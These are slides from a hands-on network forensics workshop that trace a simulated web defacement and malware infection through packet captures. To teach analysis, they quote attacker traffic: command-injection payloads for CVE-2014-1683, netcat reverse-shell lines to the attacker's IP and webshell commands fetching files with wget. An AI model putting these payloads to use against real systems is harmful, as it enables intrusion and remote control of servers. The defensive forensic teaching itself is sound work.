2015-04-30

WWW.FORSVARSMAKTEN.SE

Hands-on Network Forensics Workshop Preparations:

1. Unzip the virtual machine

from NetworkForensics_

VirtualBox.zip on your

EXTENSIVE USE OF

USB thumb drive to your

local hard drive

COMMAND LINE

2. Start VirtualBox and run

the Security Onion VM

IN THIS WORKSHOP

3. Log in with:

user/password

1

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Hands-on Network Forensics

Erik Hjelmvik, Swedish Armed Forces CERT FIRST 2015, Berlin

2

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Hands-on Network Forensics Workshop Preparations:

1. Unzip the virtual machine

from NetworkForensics_

VirtualBox.zip on your

EXTENSIVE USE OF

USB thumb drive to your

local hard drive

COMMAND LINE

2. Start VirtualBox and run

the Security Onion VM

IN THIS WORKSHOP

3. Log in with:

user/password

3

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

"Password" Ned

4

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

SysAdmin: Homer

5

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

PR /Marketing: Krusty the Clown

6

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Password Ned AB = pwned.se

7

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

pwned.se Network

[INTERNET]

|

Default Gateway

192.168.0.1

PASSWORD-NED-XP

www.pwned.se

|

192.168.0.53

192.168.0.2

[TAP]--->Security-

|

|

|

Onion

-----+------+---------+---------+----------------+-------

|

|

Homer-xubuntu

Krustys-PC

192.168.0.51

192.168.0.54

8

FM CERT

2015-04-30
Security Onion

WWW.FORSVARSMAKTEN.SE

9

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Paths (also on Cheat Sheet)
· PCAP files:
/nsm/sensor_data/securityonion_eth1/dailylogs/
· Argus files:
/nsm/sensor_data/securityonion_eth1/argus/
· Bro-IDS logs:
/nsm/bro/logs/
· ip_whitelist.py:
/usr/local/bin/ip_whitelist.py

10

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Background Traffic (1/2)
· Web browsing
­ Facebook ­ Search engines
· Chat
­ Skype ­ HipChat
· Emails
­ Webmail ­ POP3 ­ SMTP
· DropBox

11

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

12

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Timeline ­ 40 days
· Start: 2015-03-05 · Incident: Web Defacement · Incident: Spear Phishing · Incident: Malware · End: 2015-04-13

13

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Incident #1: FrogSquad
· The hacker collective FrogSquad defaced www.pwned.se on March 12, 12:58 UTC.
· Attackers uploaded a FrogSquad image to:
www.pwned.se/skyblue/fr.jpg

14

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 1.1 and 1.2
· Q1.1: What IP address did the attackers use? · Q1.2: How did the attacker get the fr.jpg file
to the webserver?
· Recommended tools:
­ Wireshark (Conversations and Follow TCP Stream)
­ Tshark (-T fields) ­ NetworkMiner (Parameters tab)

15

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Filtering with Wireshark

16

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Filtering with Tshark
user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-0312$ tshark -r snort.log.1426118407 -R "http.request.uri contains fr.jpg" -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
Mar 12, 2015 12:58:04.111324000 217.195.49.146 www.pwned.se /skyblue/fr.jpg Mar 12, 2015 12:59:40.763353000 217.195.49.146 www.pwned.se /skyblue/fr.jpg Mar 12, 2015 13:01:48.418134000 217.195.49.146 www.pwned.se /skyblue/fr.jpg Mar 12, 2015 13:03:36.254940000 217.195.49.146 www.pwned.se /skyblue/fr.jpg Mar 12, 2015 13:03:36.576778000 217.195.49.146 www.pwned.se /skyblue/fr.jpg

17

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Many POSTs to index.php?pid=4

user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-03-12$ tshark -r snort.log.1426118407 -R "http.request and ip.addr eq 217.195.49.146" -T fields -e http.request.method -e http.host -e http.request.uri | sort | uniq -c | sort -rn | head

13 POST 10 GET
5 GET 5 GET 5 GET 5 GET 5 GET 5 GET 5 GET 5 GET

www.pwned.se www.pwned.se www.pwned.se www.pwned.se www.pwned.se www.pwned.se www.pwned.se www.pwned.se www.pwned.se www.pwned.se

/skyblue/index.php?pid=4 /skyblue/ /skyblue/FrogSquad.jpg /skyblue/fr.jpg /skyblue/fr.html /skyblue/data/skins/techjunkie/images/wrap.gif /skyblue/data/skins/techjunkie/images/pointer.gif /skyblue/data/skins/techjunkie/images/nav.gif /skyblue/data/skins/techjunkie/images/header.gif /skyblue/data/skins/techjunkie/images/footer-top-sep.gif

18

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Malicious HTTP POST requests

19

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

SkyBlueCanvas' functions.php
· CVE-2014-1683 (Command Injection Vuln.)
· Attacker controls $msg via "name" parameter
function bashMail($sbj, $msg, $to, $cc='', $bc='') { $cmd = 'echo "'.$msg.'" | mail -s "'.$sbj.'" '.$to; exec($cmd, $err); $res = count($err) == 0 ? 1 : 4 ; return $res;
}

20

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

HTTP POST Command Injection
user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-03-12$ tshark -r snort.log.1426118407 -R "http.request.method==POST and ip.addr==217.195.49.146" -T fields -e text | cut -d, -f 8 | cut -d \& -f 2 [...] name=test%22%3B+ping+-c+2+217.195.49.146%3B+echo+%22 name=test%22%3B+sleep+4%3B+%22 name=test%22+%7C+nc+217.195.49.146+63122%3B+echo+%22 name=test%22+%7C+nc+217.195.49.146+63122%3B+echo+%22 name=test%22+%7C+nc+-e+%2Fbin%2Fsh+217.195.49.146+63122%3B+echo+%22 name=test%22+%7C+nc+-e+%2Fbin%2Fsh+217.195.49.146+63122%3B+echo+%22

21

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

"name" parameter in NetworkMiner
user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-03-12$ tcpdump -r snort.log.1426118407 -w /var/tmp/217.195.49.146.pcap host 217.195.49.146 user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-03-12$ /opt/networkminer/networkminer /var/tmp/217.195.49.146.pcap

22

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Reverse shell through Netcat

23

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 1.1 and 1.2
· A1.1: Attacker IP = 217.195.49.146 · A1.2: Steps carried out by attacker:
­ Launch reverse shell through command injection (CVE-2014-1683)
­ Download fr.jpg and fr.html with wget

24

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 1.3

· Q1.3:

Show how the web page looked after the defacement for URL http://www.pwned.se/skyblue/

· Tip: NetworkMiner has already extracted all files downloaded from the webserver here:
/opt/networkminer/AssembledFiles/192.168.0.2/HTTP - TCP 80/skyblue/

25

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 1.3
· A1.3: Defaced index.html is extracted here:
file:///opt/networkminer/AssembledFiles/192.168.0.2/HTTP - TCP 80/skyblue/index[6].html

26

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 1.4

· The attacker also placed a webshell (PHP backdoor) here: www.pwned.se/skyblue/cm0.php
· Q1.4: List all commands FrogSquad sent using the cm0 backdoor on March 12

· Recommended tools
­ tshark (-T fields -e http.request.uri) ­ NetworkMiner (Parameters tab)

Proceed to Bonus Question 1.5 when
finished!

27

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

HTTP filtering with Tshark
· user@securityonion:/nsm/sensor_data/sec urityonion-eth1/dailylogs/2015-03-12$ tshark -r snort.log.1426118407 -R "http.request.uri contains cm0.php" -T fields -e http.request.uri | ruby -r uri -ne 'puts(URI.decode $_)'

28

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-03-12$ tshark -r snort.log.1426118407 -R "http.request.uri contains cm0.php" -T fields -e http.request.uri | ruby -r uri -ne 'puts(URI.decode $_)'

/cm0.php?cmd=pwd

/cm0.php?cmd=pwd

/skyblue/cm0.php?cmd=pwd

/skyblue/cm0.php?cmd=cat index.php

/skyblue/cm0.php?cmd=ls

/skyblue/cm0.php?cmd=ls

/skyblue/cm0.php?cmd=nc 217.195.49.146 63129 > fr.html

/skyblue/cm0.php?cmd=ls

/skyblue/cm0.php?cmd=cat fr.html

/skyblue/cm0.php?cmd=nc 217.195.49.146 63129 >FrogSquad.jpg

/skyblue/cm0.php?cmd=ls

/skyblue/cm0.php?cmd=ls -l F*

/skyblue/cm0.php?cmd=nc 217.195.49.146 63129 >FrogSquad.jpg

/skyblue/cm0.php?cmd=ls -l F*

/skyblue/cm0.php?cmd=wget http://217.195.49.146:63129/fr.html

/skyblue/cm0.php?cmd=wget http://217.195.49.146:63129/fr.gif

/skyblue/cm0.php?cmd=ls

/skyblue/cm0.php?cmd=ls -lrt

/skyblue/cm0.php?cmd=wget -?

/skyblue/cm0.php?cmd=wget -? 2>&1

/skyblue/cm0.php?cmd=wge 2>&1

/skyblue/cm0.php?cmd=ls -l F*

/skyblue/cm0.php?cmd=ls -l fr*

/skyblue/cm0.php?cmd=nc -e /bin/sh 217.195.49.146 63122

/skyblue/cm0.php?cmd=ls -l

/skyblue/cm0.php?cmd=ls -la

/skyblue/cm0.php?cmd=ls -la 2>&1

/skyblue/cm0.php?cmd=ls -la

29

FM CERT

2015-04-30
Answer 1.4

WWW.FORSVARSMAKTEN.SE

30

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Question 1.5
· Q1.5: Did FrogSquad come back at a later time from the same class C IP network (217.195.49.0/24)?

31

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

user@securityonion:/nsm/sensor_data/securityonion-eth1/argus$ racluster -R * -n -- net 217.195.49.0/24

StartTime Proto

SrcAddr Sport Dir

DstAddr Dport TotPkts

SrcBytes

DstBytes

2015-03-11 13:52:39 tcp

217.195.49.112.50875

->

192.168.0.2.80

10

480

1316

2015-03-11 13:54:01 tcp

217.195.49.112.50879

->

192.168.0.2.80

10

780

819

2015-03-11 13:53:58 tcp

217.195.49.112.50877

->

192.168.0.2.80

126

4945

78470

2015-03-11 13:54:01 tcp

217.195.49.112.50881

->

192.168.0.2.80

10

780

773

2015-03-11 13:53:58 tcp

217.195.49.112.50876

->

192.168.0.2.80

185

8836

122352

2015-03-11 13:54:01 tcp

217.195.49.112.50880

->

192.168.0.2.80

19

1567

5247

2015-03-11 13:54:01 tcp

217.195.49.112.50878

->

192.168.0.2.80

34

1571

18257

2015-03-11 13:54:37 tcp

217.195.49.112.50882

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:40 tcp

217.195.49.112.50889

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:44 tcp

217.195.49.112.50924

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:46 tcp

217.195.49.112.50939

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:48 tcp

217.195.49.112.50966

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:50 tcp

217.195.49.112.51001

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:52 tcp

217.195.49.112.51042

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:54 tcp

217.195.49.112.51091

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:56 tcp

217.195.49.112.51146

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:57 tcp

217.195.49.112.51208

->

192.168.0.2.80

4

206

74

2015-03-11 13:54:59 tcp

217.195.49.112.51303

->

192.168.0.2.80

4

206

74

2015-03-11 13:55:01 tcp

217.195.49.112.51383

->

192.168.0.2.80

4

206

74

2015-03-11 13:55:02 tcp

217.195.49.112.51490

->

192.168.0.2.80

4

206

74

2015-03-11 13:55:03 tcp

217.195.49.112.51577

->

192.168.0.2.80

4

206

74

2015-03-11 13:55:05 tcp

217.195.49.112.51670

->

192.168.0.2.80

4

206

74

2015-03-11 13:55:05 tcp

217.195.49.112.35083

->

192.168.0.2.22

4

206

74

2015-03-11 13:55:07 tcp

217.195.49.112.51821

->

192.168.0.2.80

4

206

74

2015-03-11 13:55:09 tcp

217.195.49.112.51953

->

192.168.0.2.80

4

206

74

2015-03-11 13:55:10 tcp

217.195.49.112.52097

->

192.168.0.2.80

4

206

74

[...]

32

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Answer 1.5
· A: Yes
­ TCP 80 (HTTP) was accessed on:
· 2015-03-11 · 2015-03-12 · 2015-03-16 · 2015-03-19
­ TCP 22 (SSH) was accessed on:
· 2015-03-11 · 2015-03-12
· Command:
­ racluster -R * -nu ­ net 217.195.49.0/24

33

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

IDS / Blacklist Information Overload

34

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Filtering with Whitelists
· No signatures needed · Detection of 0-day vulnerability attacks
Rinse-Repeat Process: 1. Look at network traffic 2. Define what's normal (whitelist) 3. Remove that 4. GOTO 1.

35

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Flow analysis with Argus
· Argus tracks bi-directional flows in network traffic · Developer: Carter Bullard
· 4.1 GB PCAP = 297 MB Argus
­ Only requires ~7% disk compared to FPC
· Useful Commands:
­ Ra : Prints Argus records ­ Rasort : Sorts Argus records ­ Racluster : Clusters/merges Argus records ­ Rafilteraddr : Selects Argus records that include IP addresses in
a text file

36

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Argus Example: ra

ra [options] [-- filter-expression] -n suppress port number to service conversion. -r [- | <file file ...>] Read data from <files> in the order presented on the commandline. '-' denotes stdin. -R <dir dir ...> Recursively descend the directory and process all the regular files that are encountered.

user@securityonion:/nsm/sensor_data/securityonion-eth1/argus$ ra -R * -n -- net 217.195.49.0/24 | head

StartTime Proto

SrcAddr Sport Dir

DstAddr Dport TotPkts

2015-03-11 13:52:39 tcp

217.195.49.112.50875

->

192.168.0.2.80

10

2015-03-11 13:53:58 tcp

217.195.49.112.50876

->

192.168.0.2.80

182

2015-03-11 13:53:58 tcp

217.195.49.112.50877

->

192.168.0.2.80

123

2015-03-11 13:54:01 tcp

217.195.49.112.50878

->

192.168.0.2.80

31

2015-03-11 13:54:01 tcp

217.195.49.112.50879

->

192.168.0.2.80

7

2015-03-11 13:54:01 tcp

217.195.49.112.50880

->

192.168.0.2.80

16

2015-03-11 13:54:01 tcp

217.195.49.112.50881

->

192.168.0.2.80

7

2015-03-11 13:54:07 tcp

217.195.49.112.50879

->

192.168.0.2.80

3

2015-03-11 13:54:07 tcp

217.195.49.112.50877

->

192.168.0.2.80

3

37

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Argus Example: racluster

user@securityonion:/nsm/sensor_data/securityonion-eth1/argus$ racluster -R * -n -- net 217.195.49.0/24 |

head

StartTime Proto

SrcAddr Sport Dir

DstAddr Dport TotPkts

2015-03-11 13:52:39 tcp

217.195.49.112.50875

->

192.168.0.2.80

10

2015-03-11 13:54:01 tcp

217.195.49.112.50879

->

192.168.0.2.80

10

2015-03-11 13:53:58 tcp

217.195.49.112.50877

->

192.168.0.2.80

126

2015-03-11 13:54:01 tcp

217.195.49.112.50881

->

192.168.0.2.80

10

2015-03-11 13:53:58 tcp

217.195.49.112.50876

->

192.168.0.2.80

185

2015-03-11 13:54:01 tcp

217.195.49.112.50880

->

192.168.0.2.80

19

2015-03-11 13:54:01 tcp

217.195.49.112.50878

->

192.168.0.2.80

34

2015-03-11 13:54:37 tcp

217.195.49.112.50882

->

192.168.0.2.80

4

2015-03-11 13:54:40 tcp

217.195.49.112.50889

->

192.168.0.2.80

4

38

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Argus Example: racluster + rasort

user@securityonion:/nsm/sensor_data/securityonion-eth1/argus$ racluster -R * -w - -- net 217.195.49.0/24

| rasort -m stime -n | head

StartTime Proto

SrcAddr Sport Dir

DstAddr Dport TotPkts

2015-03-11 13:52:39 tcp

217.195.49.112.50875

->

192.168.0.2.80

10

2015-03-11 13:53:58 tcp

217.195.49.112.50876

->

192.168.0.2.80

185

2015-03-11 13:53:58 tcp

217.195.49.112.50877

->

192.168.0.2.80

126

2015-03-11 13:54:01 tcp

217.195.49.112.50878

->

192.168.0.2.80

34

2015-03-11 13:54:01 tcp

217.195.49.112.50879

->

192.168.0.2.80

10

2015-03-11 13:54:01 tcp

217.195.49.112.50880

->

192.168.0.2.80

19

2015-03-11 13:54:01 tcp

217.195.49.112.50881

->

192.168.0.2.80

10

2015-03-11 13:54:37 tcp

217.195.49.112.50882

->

192.168.0.2.80

4

2015-03-11 13:54:40 tcp

217.195.49.112.50889

->

192.168.0.2.80

4

39

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Passive DNS
· Domain names can be resolved locally by leveraging captured DNS traffic
· Search PCAP file for captured lookup:
­ tshark -r dump.pcap -R "dns.resp.addr==108.160.170.50" ­ tshark -r dump.pcap -R "dns.resp.name contains facebook.com" ­ tcpdump -r dump.pcap -n src port 53 | fgrep facebook.com
· Generate hosts file:
­ tshark -r dump.pcap -q -z hosts

40

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Tshark -z hosts

user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-03-12$ tshark -r snort.log.1426118407 -q -z hosts # TShark hosts output # # Host data gathered from snort.log.1426118407

208.239.76.34 212.227.17.171 212.227.17.187 216.58.209.142 216.58.209.110 213.155.151.154 213.155.151.155 213.155.151.148 213.155.151.149 213.155.151.150 213.155.151.15 213.155.151.152 213.155.151.153 213.155.151.185 [...]

mycompany.com pop.gmx.com pop.gmx.com sb.l.google.com safebrowsing.cache.l.google.com clients.l.google.com clients.l.google.com clients.l.google.com clients.l.google.com clients.l.google.com clients.l.google.com clients.l.google.com clients.l.google.com safebrowsing.cache.l.google.com

41

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bro logged DNS for us!

user@securityonion:/nsm/bro/logs$ fgrep 31.13.91.2 2015-*/dns.*

2015-03-06/dns.07:00:00-08:00:00.log:1425628288.380572 C29wRtsgsXuBzODDg

192.168.0.51

47752 192.168.0.1

53

udp

47202

graph.facebook.com

1

C_INTERNET

1

A

0

NOERROR

F

F

TT

0

api.facebook.com,star.c10r.facebook.com,31.13.91.2

1459.000000,1459.000000,25.000000 F

2015-03-09/dns.08:00:00-09:00:00.log:1425891225.118616 CM38JV2H70Vc9dfK4e

192.168.0.51

52502 192.168.0.1

53

udp

34217

www.facebook.com 1

C_INTERNET

1

A

0

NOERROR

F

F

TT

0

star.c10r.facebook.com,31.13.91.2

1895.000000,44.000000

2015-03-09/dns.08:00:00-09:00:00.log:1425891225.226124 ClHnbk33UXn5mVj4s9

192.168.0.51

35777 192.168.0.1

53

udp

63159

www.facebook.com 1

C_INTERNET

1

A

0

NOERROR

F

F

TT

0

star.c10r.facebook.com,31.13.91.2

1895.000000,44.000000

F

F

[...]

42

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Automating Filtering with Whitelists

Alexa provide a list of the top 1 million domains
Idea:
Ignore flows to/from domains listed by Alexa
Problem:
Flows use IP addresses, not domain names

1,google.com 2,facebook.com 3,youtube.com 4,yahoo.com 5,baidu.com 6,amazon.com 7,wikipedia.org 8,taobao.com 9,twitter.com 10,qq.com 11,google.co.in 12,live.com 13,sina.com.cn 14,linkedin.com 15,weibo.com [...]

43

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

ip_whitelist.py
· Converts domain list to IP list · Passive DNS resolution
­ Uses captured DNS lookups (Bro)
· Reduces flows in the scenario by 85% · Usage:
­ cat /usr/local/etc/top-1m.csv | ip_whitelist.py > ip_whitelist.txt ­ rafilteraddr -R * -v -f ip_whitelist.txt

44

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

ip_whitelist.py
path: /usr/local/bin/ip_whitelist.py

#!/usr/bin/env python # # Author: Erik Hjelmvik, FM CERT # Date: 2015-05-05 # # ==USAGE== # wget http://s3.amazonaws.com/alexa-static/top-1m.csv.zip # unzip top-1m.csv.zip # cat top-1m.csv | python ip_whitelist.py > ip_whitelist.txt # # The script will download the Alexa CSV file on its own if nothing is provided on STDIN: # python ip_whitelist.py > ip_whitelist.txt # # ==DESCRIPTION== # A simple script for Security Onion that produces a list of IP addresses # based on the Alexa top 1M DNS hosts. The output IP whitelist is suitable # for usage with ra (from Carter Bullard's Argus) like this: # rafilteraddr -R /nsm/sensor_data/securityonion-eth1/argus/* -v -f ip_whitelist.txt # import os import re import sys

def parse_dns_stream(stream): for tuple in re.findall(r'(\S+)\s+(\S+)\n', stream.read()): if(len(tuple) > 1 and tuple[1] != '-'): queries = [tuple[0]] answers = [] for a in tuple[1].split(","): if re_ipv4.match(a) or re_ipv6.match(a): answers.append(a) else: queries.append(a) for q in queries: s = q.split(".") for i in range(0, len(s)-1): subdomain = ".".join(s[i:]) if(subdomain in whitelist): ip_whitelist.update(answers)

whitelist = set() if(sys.stdin.isatty()):
with os.popen("curl -q 'http://s3.amazonaws.com/alexa-static/top-1m.csv.zip' | gunzip -c | cut -d, -f2") as top_domain_stream: for domain in top_domain_stream.readlines(): whitelist.add(domain.strip())
else: for csv_line in sys.stdin: whitelist.add(csv_line.split(',')[1].strip())
re_ipv4 = re.compile("^\d+\.\d+\.\d+\.\d+") re_ipv6= re.compile("^([0-9a-fA-F]{1,4}:)+:*[0-9a-fA-F]{1,4}") ip_whitelist = set() with os.popen("gunzip -c /nsm/bro/logs/20*/dns*.log.gz 2>/dev/null | bro-cut query answers") as stream:
parse_dns_stream(stream) with os.popen("cat /nsm/bro/logs/20*/dns.*.log 2>/dev/null | bro-cut query answers") as stream:
parse_dns_stream(stream) for ip in ip_whitelist:
print(ip)

45

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

46

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 2.1
· Q 2.1: From which three "odd" (nonlegitimate) domain names ware the largest downloads made by Ned's computer (192.168.0.53)?
· Tip: disregard downloads from Microsoft/Google/Facebook/Akamai and other common domains

47

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

rafilteraddr + ip_whitelist

rafilteraddr -R * -v -f /usr/local/etc/ip_whitelist.txt -w - -- src host 192.168.0.53 and not dst net 192.168.0.0/16 | racluster -w - | rasort -m dbytes -n | head

DstBytes

StartTime Proto

SrcAddr Sport Dir

DstAddr Dport TotPkts

SrcBytes

2015-04-07 13:35:01 tcp

192.168.0.53.2214

->

193.9.28.35.80

2000

49637

1597481

2015-04-07 13:35:02 tcp

192.168.0.53.2215

->

148.251.80.172.443

1463

29749

1402928

2015-04-07 13:34:43 tcp

192.168.0.53.2210

->

68.164.182.11.80

583

13754

533678

2015-03-06 14:11:39 tcp

192.168.0.53.1102

->

97.74.215.136.80

472

10223

441343

2015-03-17 07:27:56 tcp

192.168.0.53.1287

->

212.227.17.187.110

469

9895

421636

2015-03-13 08:21:24 tcp

192.168.0.53.3445

->

212.227.17.171.110

356

7375

320909

2015-04-08 22:54:01 tcp

192.168.0.53.4237

-> 217.172.189.244.80

299

6396

279543

2015-04-08 03:27:02 tcp

192.168.0.53.2042

-> 217.172.189.243.80

290

6156

273205

2015-03-09 09:36:54 tcp

192.168.0.53.1136

->

213.186.33.2.80

273

6048

250896

48

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.1

· A2.1: www.mybusinessdoc.com, 193.9.28.35 and 1.web-counter.info

2015-04-07 13:34:43 68.164.182.11:80 2015-04-07 13:35:01 193.9.28.35:80 2015-04-07 13:35:02 148.251.80.172:443

0.5 MB downloaded 1.5 MB downloaded 1.4 MB downloaded

49

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 2.2

· Q2.2: Are the files downloaded from www.mybusinessdoc.com (68.164.182.11) malicious?

· Recommended tools:
­ tcpdump (filter with BPF: host 68.164.182.11)
­ NetworkMiner (Files tab) OR Wireshark (File > Export > Objects > HTTP)
­ VirusTotal.com (search for MD5/SHA hash)

50

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Files tab in NetworkMiner
user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-04-07$ tcpdump -r snort.log.1428364808 -w /var/tmp/68.164.182.11.pcap host 68.164.182.11 user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-04-07$ /opt/networkminer/networkminer /var/tmp/68.164.182.11.pcap

51

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Details on Downloaded Files

user@securityonion:/opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80$ file *

551d88323f7e.gif: PE32 executable (GUI) Intel 80386, for MS Windows

c87ed3c.gif:

PE32 executable (console) Intel 80386, for MS Windows

f7.gif:

PE32 executable (GUI) Intel 80386, for MS Windows

user@securityonion:/opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80$ md5sum *

634c2a2a3ab03d5c21730c62d4677fe8 551d88323f7e.gif

de3d95855cbe959385a558458947d746 c87ed3c.gif

d48ef4bb0549a67083017169169ef3ee f7.gif

user@securityonion:/opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80$

52

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Export HTTP Objects in Wireshark

53

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Solution: Bro logs

user@securityonion:/nsm/bro/logs/2015-04-07$ fgrep 68.164.182.11 files*.log

files.13:00:00-14:00:00.log:1428413684.563590 FGx5ts2iCMfZSUgO8c 68.164.182.11

192.168.0.53

Cvvb8T21iyrxsUlmAd HTTP

0

MD5,EXTRACT,SHA1

application/x-dosexec c87ed3c.gif 2.169630 F

F

318883 318883

0

0

F

-

de3d95855cbe959385a558458947d746

a194ae4291a5150583fbb486e4908a0241a82de4 -

/nsm/bro/extracted/HTTP-

FGx5ts2iCMfZSUgO8c.exe

files.13:00:00-14:00:00.log:1428413687.442979 FuFeW33aTSTxXihCql 68.164.182.11

192.168.0.53

Cvvb8T21iyrxsUlmAd HTTP

0

MD5,EXTRACT,SHA1

application/x-dosexec 551d88323f7e.gif

0.728051 F

F192512 192512

0

0

F

-

634c2a2a3ab03d5c21730c62d4677fe8

a9a1911fe2ff864a7d181bb7750b60b74033c3b1 -

/nsm/bro/extracted/HTTP-

FuFeW33aTSTxXihCql.exe

files.13:00:00-14:00:00.log:1428413688.373888 F2rjhJZAjwGdIvTM8 68.164.182.11

192.168.0.53

Cvvb8T21iyrxsUlmAd HTTP

0

MD5,EXTRACT,SHA1

application/x-dosexec f7.gif

0.000000 F

F

15361536 0

0

F

-

d48ef4bb0549a67083017169169ef3ee

7a502160f3492e76ea4147c6684432191657443e -

/nsm/bro/extracted/HTTP-

F2rjhJZAjwGdIvTM8.exe

54

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

c87ed3c.gif
de3d95855cbe959385a558458947d746

55

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

551d88323f7e.gif
634c2a2a3ab03d5c21730c62d4677fe8

56

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

f7.gif
d48ef4bb0549a67083017169169ef3ee

57

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.2
· A2.2: All files from mybusinessdoc.com seem to be malicious
­ c87ed3c.gif (MZ file, MD5: de3d95855cbe959385a558458947d746) ­ 551d88323f7e.gif (MZ file, MD5: 634c2a2a3ab03d5c21730c62d4677fe8) ­ f7.gif (MZ file, MD5: d48ef4bb0549a67083017169169ef3ee)

58

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 2.3
· Q2.3: Does the HTML page downloaded from 193.9.28.35 look legitimate?

· Recommended Tools:
­ Tcpdump (filter with BPF: host 193.9.28.35) ­ NetworkMiner (Files tab)

59

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Tcpdump + NetworkMiner
$ tcpdump -r /nsm/sensor_data/securityonion-eth1/dailylogs/2015-0407/snort.log.1428364808 -w /var/tmp/193.9.28.35.pcap host 193.9.28.35 $ /opt/networkminer/networkminer /var/tmp/193.9.28.35.pcap

60

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

61

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.3
· A2.3: No it does not look legitimate. It is a 1.4 MB base64 encoded string inside <html><body> tags
· Wanna dig deeper?
­ The Emerging Threats Snort signature 2018582 triggered on the HTTP GET request: https://127.0.0.1:444/events/view?cid=4925&sid=1
­ More details on the Miuref/Boaxxe Trojan: http://www.welivesecurity.com/2014/01/17/boaxxeadware-a-good-advert-sells-the-product-withoutdrawing-attention-to-itself-part-2/

62

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 2.4
· Q2.4: Did the download from 1.webcounter.info (148.251.80.172) use HTTP, SSL or something else?

· Recommended Tool:
­ Wireshark
· Display filter "ip.addr eq 148.251.80.172"

63

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.4
· A2.4: It's something else (not SSL/TLS)

64

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Theory: Wireshark's Find Packet

· Finds one packet at time · [Ctrl+F] or Edit > Find Packet
